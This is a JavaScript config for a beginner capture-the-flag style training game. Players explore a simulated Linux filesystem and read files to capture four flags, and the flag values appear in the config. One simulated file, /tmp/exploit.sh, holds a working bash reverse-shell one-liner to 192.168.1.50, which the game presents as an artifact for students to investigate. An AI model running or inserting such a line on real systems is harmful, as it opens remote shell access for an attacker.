/* ================================================================
   LINUX-FS-01: Root Access — Config
   ================================================================
   Filesystem exploration mission. Grid cells represent directories
   instead of network nodes. No traps, no gates — pure navigation
   and file reading. 4 flags hidden across the filesystem.

   Converted to TerminalInterpreter config-driven pattern.
   Custom commands: ls, cat, grep, find, pwd
   Overrides: scan, move (filesystem language), status, help
   ================================================================ */

var LINUX_FS_01_CONFIG = {
    id: 'linux-fs-01',
    missionTitle: 'LINUX-FS-01',
    title: 'Root Access',
    subtitle: 'Navigate the Linux filesystem and capture all four flags.',
    category: 'linux-filesystem',
    difficulty: 1,
    inputMode: 'terminal',
    promptText: 'root@hexworth:~# ',
    promptLabel: 'OPERATOR TERMINAL',

    briefing: [
        'Navigate the filesystem. Find all 4 flags.',
        'Use ls, cat, grep, find to explore.',
        'Flags are hidden in specific directories.'
    ],

    notFoundMsg: 'Unknown command: {cmd}. Type "help".',

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['root-home',  'etc-dir',   'var-log',  'usr-bin',   'wall'],
            ['empty',      'opt-dir',   'empty',    'tmp-dir',   'srv-dir'],
            ['wall',       'home-user', 'empty',    'empty',     'wall'],
            ['wall',       'wall',      'dev-dir',  'wall',      'wall']
        ]
    },

    nodes: {
        'root-home': { label: '/root',      abbr: 'ROOT', ip: '(superuser)', os: 'drwx------',  ports: ['.bashrc','.ssh/','flag1.txt'],               desc: 'Root home directory -- restricted access',            hasFlag: true,  flagFile: 'flag1.txt', flagValue: 'FLAG{r00t_4ccess_gr4nted}' },
        'etc-dir':   { label: '/etc',       abbr: 'ETC',  ip: '(configs)',   os: 'drwxr-xr-x', ports: ['passwd','shadow','hosts','crontab'],           desc: 'System configuration files',                         hasFlag: false },
        'var-log':   { label: '/var/log',   abbr: 'LOG',  ip: '(logs)',      os: 'drwxr-xr-x', ports: ['syslog','auth.log','kern.log','flag2.txt'],    desc: 'System and application log files',                   hasFlag: true,  flagFile: 'flag2.txt', flagValue: 'FLAG{l0g_4nalysis_m4ster}' },
        'usr-bin':   { label: '/usr/bin',   abbr: 'BIN',  ip: '(binaries)',  os: 'drwxr-xr-x', ports: ['python3','vim','git','curl','nmap'],            desc: 'User command binaries',                              hasFlag: false },
        'opt-dir':   { label: '/opt',       abbr: 'OPT',  ip: '(optional)',  os: 'drwxr-xr-x', ports: ['webapp/','tools/','flag3.txt'],                desc: 'Optional third-party software',                      hasFlag: true,  flagFile: 'flag3.txt', flagValue: 'FLAG{0pt_d1rectory_h1dden}' },
        'tmp-dir':   { label: '/tmp',       abbr: 'TMP',  ip: '(temp)',      os: 'drwxrwxrwt', ports: ['.hidden/','session.tmp','exploit.sh'],         desc: 'Temporary files -- world-writable',                  hasFlag: false },
        'srv-dir':   { label: '/srv',       abbr: 'SRV',  ip: '(services)',  os: 'drwxr-xr-x', ports: ['www/','ftp/','flag4.txt'],                     desc: 'Service data directory',                              hasFlag: true,  flagFile: 'flag4.txt', flagValue: 'FLAG{s3rv1ce_d4ta_f0und}' },
        'home-user': { label: '/home/user', abbr: 'USR',  ip: '(student)',   os: 'drwxr-xr-x', ports: ['Desktop/','Documents/','notes.txt'],           desc: 'Student home directory',                              hasFlag: false },
        'dev-dir':   { label: '/dev',       abbr: 'DEV',  ip: '(devices)',   os: 'drwxr-xr-x', ports: ['null','zero','random','sda1'],                 desc: 'Device special files',                                hasFlag: false }
    },

    /* File contents for cat command — keyed by cell type then filename */
    fileContents: {
        'root-home': {
            '.bashrc':    'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nexport PS1="root@hexworth:~# "\nalias ll="ls -la"\nalias rm="rm -i"',
            '.ssh/':      '[directory] authorized_keys  id_rsa  id_rsa.pub  known_hosts',
            'flag1.txt':  'FLAG{r00t_4ccess_gr4nted}'
        },
        'etc-dir': {
            'passwd':     'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nstudent:x:1000:1000:student:/home/user:/bin/bash',
            'shadow':     '[Permission denied] Cannot read /etc/shadow without elevated privileges.\nHint: You already have root access.',
            'hosts':      '127.0.0.1       localhost\n127.0.1.1       hexworth\n10.0.0.1        gateway.hexworth.local\n10.0.0.99       target.hexworth.local',
            'crontab':    '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 * * * *  root  cd / && run-parts --report /etc/cron.hourly\n25 6 * * *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n0  3 * * 0  root  /opt/tools/backup.sh >> /var/log/backup.log 2>&1'
        },
        'var-log': {
            'syslog':     'Mar  5 08:12:01 hexworth systemd[1]: Started Session 42 of user root.\nMar  5 08:12:03 hexworth kernel: [42069.123] eth0: link up\nMar  5 08:15:22 hexworth CRON[1337]: (root) CMD (/opt/tools/backup.sh)\nMar  5 08:20:01 hexworth systemd[1]: Starting Cleanup of Temporary Directories...',
            'auth.log':   'Mar  5 03:14:07 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:09 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:12 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:15 hexworth sshd[9001]: Connection closed by 192.168.1.50 port 44231 [preauth]\nMar  5 06:00:01 hexworth sshd[9200]: Accepted publickey for root from 10.0.0.1 port 22',
            'kern.log':   'Mar  5 00:00:02 hexworth kernel: [    0.000000] Linux version 6.1.0-hexworth (gcc 12.2.0)\nMar  5 00:00:02 hexworth kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz-6.1.0\nMar  5 00:00:02 hexworth kernel: [    0.523104] EXT4-fs (sda1): mounted filesystem with ordered data mode',
            'flag2.txt':  'FLAG{l0g_4nalysis_m4ster}'
        },
        'usr-bin': {
            'python3':    '[binary] Python 3.12.1 interpreter  /usr/bin/python3',
            'vim':        '[binary] Vi IMproved 9.0            /usr/bin/vim',
            'git':        '[binary] git version 2.43.0         /usr/bin/git',
            'curl':       '[binary] curl 8.5.0                 /usr/bin/curl',
            'nmap':       '[binary] Nmap 7.94                  /usr/bin/nmap'
        },
        'opt-dir': {
            'webapp/':    '[directory] index.html  app.js  config.json  .env',
            'tools/':     '[directory] backup.sh  monitor.py  deploy.sh',
            'flag3.txt':  'FLAG{0pt_d1rectory_h1dden}'
        },
        'tmp-dir': {
            '.hidden/':   '[directory] .cache  .runtime  .sock',
            'session.tmp': 'SESSION_ID=a3f8c2e1b9d04567\nUSER=www-data\nEXPIRES=1709683200\nTOKEN=eyJhbGciOiJIUzI1NiJ9.dGVzdA.abc123',
            'exploit.sh': '#!/bin/bash\n# Suspicious script found in /tmp\nbash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n# WARNING: This is a reverse shell!\n# Attacker IP: 192.168.1.50\n# Check auth.log for related login attempts'
        },
        'srv-dir': {
            'www/':       '[directory] html/  cgi-bin/  logs/  .htaccess',
            'ftp/':       '[directory] pub/  incoming/  users/',
            'flag4.txt':  'FLAG{s3rv1ce_d4ta_f0und}'
        },
        'home-user': {
            'Desktop/':   '[directory] (empty)',
            'Documents/': '[directory] homework.txt  project/  README.md',
            'notes.txt':  'TODO:\n- Check /var/log/auth.log for failed logins\n- Look for suspicious scripts in /tmp\n- Review crontab entries in /etc\n- Investigate /opt for hidden flags\n- Explore /srv service directories'
        },
        'dev-dir': {
            'null':       '[character special] /dev/null \u2014 data sink, discards all input',
            'zero':       '[character special] /dev/zero \u2014 produces continuous null bytes',
            'random':     '[character special] /dev/random \u2014 cryptographic random number generator',
            'sda1':       '[block special] /dev/sda1 \u2014 primary disk partition, 50GB, ext4'
        }
    },

    traps: [],
    gates: {},

    customState: {
        flagsFound: [],
        dirsVisited: []
    },

    statusFields: [
        { key: 'flagsFound', label: 'Flags captured', trueText: '', falseText: '0/4' }
    ],

    objectives: [
        { id: 'flag1', label: 'FLAG-1 CAPTURED -- /root/flag1.txt',    check: 'flagsFound.indexOf("root-home") !== -1' },
        { id: 'flag2', label: 'FLAG-2 CAPTURED -- /var/log/flag2.txt', check: 'flagsFound.indexOf("var-log") !== -1' },
        { id: 'flag3', label: 'FLAG-3 CAPTURED -- /opt/flag3.txt',     check: 'flagsFound.indexOf("opt-dir") !== -1' },
        { id: 'flag4', label: 'FLAG-4 CAPTURED -- /srv/flag4.txt',     check: 'flagsFound.indexOf("srv-dir") !== -1' }
    ],

    integrity: 3,

    completion: {
        title: 'ROOT ACCESS',
        subtitle: 'Filesystem explored. All flags captured.',
        storageKey: 'hexworth_operator_linuxfs01'
    },

    /* ----------------------------------------------------------------
       Terminal Commands -- filesystem-flavored overrides + custom cmds
       ---------------------------------------------------------------- */
    terminalCommands: {

        /* Override scan with filesystem language */
        'scan': {
            help: 'Survey area, reveal adjacent directories',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var col = s.position.col, row = s.position.row;
                var cellType = c.grid.cells[row][col];
                e.printLine('Scanning area...', 'system');
                e.printLine('', 'system');
                if (cellType !== 'empty' && cellType !== 'wall') {
                    var cur = c.nodes[cellType];
                    e.printLine('Current: ' + cur.label + ' ' + cur.ip, 'heading');
                    e.printLine(cur.desc, 'info');
                    e.printLine('Permissions: ' + cur.os, 'node-info');
                } else {
                    e.printLine('Current: Empty path (no directory)', 'heading');
                }
                e.printLine('', 'system');
                e.printLine('Adjacent:', 'heading');
                var dirs = [{name:'North',dc:0,dr:-1},{name:'South',dc:0,dr:1},{name:'East',dc:1,dr:0},{name:'West',dc:-1,dr:0}];
                for (var i = 0; i < dirs.length; i++) {
                    var d = dirs[i], nc = col+d.dc, nr = row+d.dr;
                    if (nc<0||nc>=c.grid.cols||nr<0||nr>=c.grid.rows) { e.printLine('  '+d.name+': [filesystem boundary]','system'); continue; }
                    var type = c.grid.cells[nr][nc];
                    if (type==='wall') { e.printLine('  '+d.name+': [inaccessible]','system'); continue; }
                    var key = nc+','+nr;
                    if (!s.visibility[key]||s.visibility[key]==='hidden') s.visibility[key]='revealed';
                    if (type==='empty') { e.printLine('  '+d.name+': Empty path','info'); }
                    else { var info=c.nodes[type]; e.printLine('  '+d.name+': '+info.label+' '+info.ip,'node-info'); }
                }
                e.updateGrid();
                e.saveState();
            }
        },

        /* Override move with filesystem language + dirsVisited tracking */
        'move': {
            help: 'Move (north/south/east/west or n/s/e/w)',
            syntax: 'move <dir>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: move <direction>','error'); return; }
                var dirMap = {'north':[0,-1],'n':[0,-1],'south':[0,1],'s':[0,1],'east':[1,0],'e':[1,0],'west':[-1,0],'w':[-1,0]};
                var dir = args[0].toLowerCase();
                if (!dirMap[dir]) { e.printLine('Unknown direction: '+args[0],'error'); return; }
                var d=dirMap[dir], newCol=s.position.col+d[0], newRow=s.position.row+d[1];
                if (newCol<0||newCol>=c.grid.cols||newRow<0||newRow>=c.grid.rows) { e.printLine('Filesystem boundary.','error'); return; }
                var cellType = c.grid.cells[newRow][newCol];
                if (cellType==='wall') { e.printLine('Inaccessible.','error'); return; }
                s.position = {col:newCol, row:newRow};
                s.visibility[newCol+','+newRow] = 'visited';
                if (cellType!=='empty' && s.dirsVisited.indexOf(cellType) === -1) s.dirsVisited.push(cellType);
                if (cellType!=='empty' && c.nodes[cellType]) s.nodesDiscovered.add(cellType);
                e.revealAdjacent(newCol,newRow);
                var dirFull={n:'north',s:'south',e:'east',w:'west'}, dirName=dirFull[dir]||dir;
                if (cellType==='empty') { e.printLine('cd '+dirName+'... Empty path.','system'); }
                else { var info=c.nodes[cellType]; e.printLine('cd '+dirName+'... '+info.label+' '+info.ip,'success'); e.printLine(info.desc,'info'); e.printLine('Permissions: '+info.os,'node-info'); }
                e.updateGrid(); e.saveState();
            }
        },

        /* cd alias for move */
        'cd': {
            help: 'Alias for move',
            syntax: 'cd <dir>',
            handler: function(args, ctx) {
                ctx.config.terminalCommands['move'].handler(args, ctx);
            }
        },

        /* Override status with filesystem-specific info */
        'status': {
            help: 'Show position and objectives',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                e.printLine('', 'system');
                e.printLine('[STATUS] Position: '+cellType+' ('+s.position.col+','+s.position.row+')','info');
                e.printLine('[STATUS] Dirs visited: '+s.dirsVisited.length,'info');
                e.printLine('[STATUS] Flags: '+s.flagsFound.length+'/4','info');
                e.printLine('[STATUS] Commands: '+s.agentCmdCount,'info');
            }
        },

        /* Override help with filesystem-specific command list */
        'help': {
            help: 'Show this reference',
            handler: function(args, ctx) {
                var e = ctx.engine;
                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
                e.printLine('  scan            Survey area, reveal adjacent directories', 'info');
                e.printLine('  move <dir>      Move (north/south/east/west or n/s/e/w)', 'info');
                e.printLine('  ls              List contents of current directory', 'info');
                e.printLine('  cat <file>      Read a file in the current directory', 'info');
                e.printLine('  grep <pattern>  Search for pattern in current directory', 'info');
                e.printLine('  find <pattern>  Search visited directories for files', 'info');
                e.printLine('  pwd             Show current directory path', 'info');
                e.printLine('  ping <node>     Check a directory by name', 'info');
                e.printLine('  status          Show position and objectives', 'info');
                e.printLine('  help            Show this reference', 'info');
                e.printLine('  clear           Clear terminal output', 'info');
            }
        },

        'ls': {
            help: 'List contents of current directory',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType==='empty'||cellType==='wall') { e.printLine('Not inside a directory.','error'); return; }
                var info = c.nodes[cellType];
                e.printLine(info.ports.join('  '), 'node-info');
            }
        },

        'cat': {
            help: 'Read a file in the current directory',
            syntax: 'cat <file>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: cat <filename>','error'); return; }
                var filename = args[0];
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType==='empty'||cellType==='wall') { e.printLine('cat: not inside a directory','error'); return; }
                var info = c.nodes[cellType];
                var files = c.fileContents[cellType];
                if (!files||!files[filename]) {
                    var inPorts = info.ports.indexOf(filename) !== -1;
                    e.printLine('cat: '+filename+': '+(inPorts?'unable to read':'No such file or directory'),'error');
                    return;
                }
                var content = files[filename];
                if (info.hasFlag && filename === info.flagFile) {
                    e.printLine(content, 'success');
                    if (s.flagsFound.indexOf(cellType) === -1) {
                        s.flagsFound.push(cellType);
                        e.printLine('', 'system');
                        e.printLine('[!] FLAG CAPTURED', 'success');
                        e.checkObjectives();
                    }
                } else {
                    var lines = content.split('\n');
                    for (var i=0;i<lines.length;i++) e.printLine(lines[i],'node-info');
                }
                e.saveState();
            }
        },

        'grep': {
            help: 'Search for pattern in current directory',
            syntax: 'grep <pattern>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: grep <pattern>','error'); return; }
                var pattern = args.join(' ').toLowerCase();
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType==='empty'||cellType==='wall') { e.printLine('grep: not inside a directory','error'); return; }
                var files = c.fileContents[cellType];
                if (!files) { e.printLine('No files to search.','error'); return; }
                var found = 0;
                var fnames = Object.keys(files);
                for (var i=0;i<fnames.length;i++) {
                    if (files[fnames[i]].toLowerCase().indexOf(pattern) !== -1) {
                        e.printLine(fnames[i]+': match found','node-info');
                        found++;
                    }
                }
                if (!found) e.printLine('No matches for "'+pattern+'"','system');
            }
        },

        'find': {
            help: 'Search visited directories for files',
            syntax: 'find <pattern>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: find <pattern>','error'); return; }
                var pattern = args.join(' ').toLowerCase();
                var currentCell = c.grid.cells[s.position.row][s.position.col];
                var keys = Object.keys(c.fileContents);
                var found = 0;
                for (var k=0;k<keys.length;k++) {
                    if (s.dirsVisited.indexOf(keys[k]) === -1 && keys[k] !== currentCell) continue;
                    var files = c.fileContents[keys[k]];
                    var fnames = Object.keys(files);
                    for (var f=0;f<fnames.length;f++) {
                        if (fnames[f].toLowerCase().indexOf(pattern) !== -1) {
                            e.printLine(c.nodes[keys[k]].label+'/'+fnames[f],'node-info');
                            found++;
                        }
                    }
                }
                if (!found) e.printLine('No files matching "'+pattern+'" in visited directories.','system');
            }
        },

        'pwd': {
            help: 'Show current directory path',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType!=='empty'&&cellType!=='wall') e.printLine(c.nodes[cellType].label,'info');
                else e.printLine('(no named directory)','system');
            }
        }
    }
};
